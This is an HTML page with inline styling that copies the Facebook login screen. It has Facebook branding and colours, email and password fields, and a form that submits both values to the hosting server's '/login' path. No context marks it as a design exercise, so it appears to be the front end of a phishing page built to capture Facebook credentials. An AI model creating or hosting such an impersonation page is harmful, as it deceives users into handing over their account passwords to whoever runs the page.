<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Login</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            width: 360px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #1877f2;
            font-size: 36px;
            margin-bottom: 15px;
            font-weight: bold;
        }
        input {
            width: 92%;
            padding: 12px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        a {
            display: block;
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        hr {
            margin: 20px 0;
            border: 0.5px solid #dadde1;
        }
        .create-btn {
            background-color: #42b72a;
            color: white;
            padding: 12px 18px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h1>facebook</h1>
        <form action="/login" method="POST">
            
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            
            <input type="password" name="password" placeholder="Password" required>
            
            <button type="submit" class="login-btn">Log In</button>
            
            <a href="#">Forgot password?</a>
            <hr>
            <button type="button" class="create-btn">Create New Account</button>
        </form>
    </div>

</body>
</html>
